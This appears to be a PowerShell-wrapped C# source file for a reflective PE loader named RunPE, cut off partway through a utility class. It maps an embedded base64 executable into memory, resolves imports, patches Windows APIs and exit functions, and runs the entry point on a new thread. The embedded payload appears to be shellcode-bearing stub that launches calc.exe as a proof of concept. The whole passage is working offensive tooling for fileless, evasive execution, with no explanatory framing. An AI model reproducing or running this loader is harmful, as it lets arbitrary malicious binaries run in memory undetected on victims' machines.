$RunPE = @"
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

namespace RunPE
{
    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            public ushort e_res_0;
            public ushort e_res_1;
            public ushort e_res_2;
            public ushort e_res_3;
            public ushort e_oemid;
            public ushort e_oeminfo;
            public ushort e_res2_0;
            public ushort e_res2_1;
            public ushort e_res2_2;
            public ushort e_res2_3;
            public ushort e_res2_4;
            public ushort e_res2_5;
            public ushort e_res2_6;
            public ushort e_res2_7;
            public ushort e_res2_8;
            public ushort e_res2_9;
            public uint e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)] public uint VirtualSize;
            [FieldOffset(12)] public uint VirtualAddress;
            [FieldOffset(16)] public uint SizeOfRawData;
            [FieldOffset(20)] public uint PointerToRawData;
            [FieldOffset(24)] public uint PointerToRelocations;
            [FieldOffset(28)] public uint PointerToLinenumbers;
            [FieldOffset(32)] public ushort NumberOfRelocations;
            [FieldOffset(34)] public ushort NumberOfLinenumbers;
            [FieldOffset(36)] public DataSectionFlags Characteristics;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            Stub = 0x00000000,
        }



        private IMAGE_DOS_HEADER dosHeader;


        private IMAGE_FILE_HEADER fileHeader;


        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;


        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;


        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        private byte[] rawbytes;

        public PELoader(byte[] fileBytes)
        {

            using (var stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                var reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);


                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                var ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (var headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                rawbytes = fileBytes;
            }
        }

        public static T FromBinaryReader<T>(BinaryReader reader)
        {

            var bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));


            var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            var theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }

        public bool Is32BitHeader
        {
            get
            {
                ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }

        public IMAGE_FILE_HEADER FileHeader
        {
            get { return fileHeader; }
        }


        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get { return optionalHeader64; }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get { return imageSectionHeaders; }
        }

        public byte[] RawBytes
        {
            get { return rawbytes; }
        }
    }

    public static class Program
    {
        private const uint EXECUTION_TIMEOUT = 30000;

        public static Encoding encoding;

        public static int Main()
        {

            try
            {
                if (IntPtr.Size != 8)
                {
                    Console.WriteLine("\n[-] Process is not 64-bit, this version of run-exe won't work !\n");
                    return -1;
                }

                var peRunDetails = ParseArgs();

                if (peRunDetails == null)
                {
                    return -10;
                }

                var peMapper = new PEMapper();
                PELoader pe;
                long currentBase;
                peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out pe, out currentBase);

                var importResolver = new ImportResolver();
                importResolver.ResolveImports(pe, currentBase);

                peMapper.SetPagePermissions();

                var argumentHandler = new ArgumentHandler();
                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
                {
                    return -3;
                }

                var fileDescriptorRedirector = new FileDescriptorRedirector();
                if (!fileDescriptorRedirector.RedirectFileDescriptors())
                {
                    Console.WriteLine("[-] Unable to redirect file descriptors");
                    return -7;
                }

                var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
                extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();


                var extraAPIPatcher = new ExtraAPIPatcher();

                if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
                {
                    return -9;
                }

                var exitPatcher = new ExitPatcher();
                if (!exitPatcher.PatchExit())
                {
                    return -8;
                }

                fileDescriptorRedirector.StartReadFromPipe();

                StartExecution(peRunDetails.args, pe, currentBase);


                exitPatcher.ResetExitFunctions();
                extraAPIPatcher.RevertAPIs();
                extraEnvironmentalPatcher.RevertExtraPatches();
                fileDescriptorRedirector.ResetFileDescriptors();
                argumentHandler.ResetArgs();
                peMapper.ClearPE();
                importResolver.ResetImports();


                var output = fileDescriptorRedirector.ReadDescriptorOutput();

                Console.WriteLine(output);

                return 0;
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error running RunPE: " + e);
                return -6;
            }
        }

        private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
        {

            try
            {
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);

                NativeDeclarations.WaitForSingleObject(hThread, EXECUTION_TIMEOUT);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error " + e + "\n");
            }

        }

        public static PeRunDetails ParseArgs()
        {
            byte[] binaryBytes;
            string[] args = new string[0];
            String base64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA5JBHdfUV/jn1Ff459RX+OWoMEjn5Ff459RX6Of0V/jnQ96o58RX+OdD3ujnxFf45SaWNofUV/jgAAAAAAAAAAAAAAAAAAAABQRQAAZIYDAH08xksAAAAAAAAAAPAAIwALAgEAADAAAAAQAAAAAAAAAEAAAAAQAAAAAABAAQAAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAJhBAABIAgAA9K8AAAIAAIAAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAgQQAAbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBBAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAE4QAAAAEAAAABIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAACEAAAAADAAAAACAAAAFgAAAAAAAAAAAAAAAAAAQAAAQC5iaG9lAAAAmAEAAABAAAAAAgAAABgAAAAAAAAAAAAAAAAAACAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7ChJx8FAAAAAScfAADAAAEjHwgAQAABIM8noJxAAAEjHwQAQAABIvkEQAEABAAAASIv486T/0EgzyegBEAAAUEFZTE9BRDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMz/JcAPAAD/JbIPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG5BAAAAAAAAfkEAAAAAAAAAAAAAAAAAAEAwAAAAAAAAAAAAAHYwAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmMAAAAAAAAFgwAAAAAAAAAAAAAAAAAAAFAUV4aXRQcm9jZXNzAFgEVmlydHVhbEFsbG9jAABLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQdBg8EBQQHB4ulSQVFIi1Igi0I8SAHQi4CIAAAASIXAdGtIAdBQi0gYRItAIEkB0ONaSP/JQYs0iEgB1k0xyUgxwKxBwckHQYPBAUEBwTjgde1MA0wkCEU50XXUWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XUi6AQAAAAAAAABIjY0JAQAAQbrRuHxM/9W7hxghdUG6fzmkAf/VSIPEKDwGfAqA++B1Bbt5IPyWagBZQYna/9VjYWxjLmV4ZQAAAAAASEEAAAAAAAD/////YEEAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG5BAAAAAAAAfkEAAAAAAAAAAAAAAAAAAEtFUk5FTDMyLmRsbAAAWARWaXJ0dWFsQWxsb2MAAAUBRXhpdFByb2Nlc3MAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
            binaryBytes = Convert.FromBase64String(base64);
            return new PeRunDetails { filename = "Calc.exe", args = args, binaryBytes = binaryBytes };
        }

    }

    public class PeRunDetails
    {
        public string filename;
        public string[] args;
        public byte[] binaryBytes;
    }

    public static class Utils
    {
        public static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {
            var moduleHandle = NativeDeclarations.GetModuleHandle(dllName);
            var pFunc = NativeDeclarations.GetProcAddress(moduleHandle, funcName);
            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);
            uint oldProtect;
            var result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, NativeDeclarations.PAGE_EXECUTE_READWRITE, out oldProtect);
            if (!result)
            {
                return null;
            }
            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);
            uint empty;
            result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out empty);
            if (!result)
            {
            }
            return originalBytes;
        }

        public static bool PatchAddress(IntPtr pAddress, IntPtr newValue)
        {
            uint oldProtect;
            var result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size, NativeDeclarations.PAGE_EXECUTE_READWRITE, out oldProtect);
            if (!result)
            {
                return false;
            }

            Marshal.WriteIntPtr(pAddress, newValue);
            uint empty;
            result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size, oldProtect, out empty);
            if (!result)
            {
                return false;
            }
            return true;
        }

        public static bool ZeroOutMemory(IntPtr start, int length)
        {
            uint oldProtect;
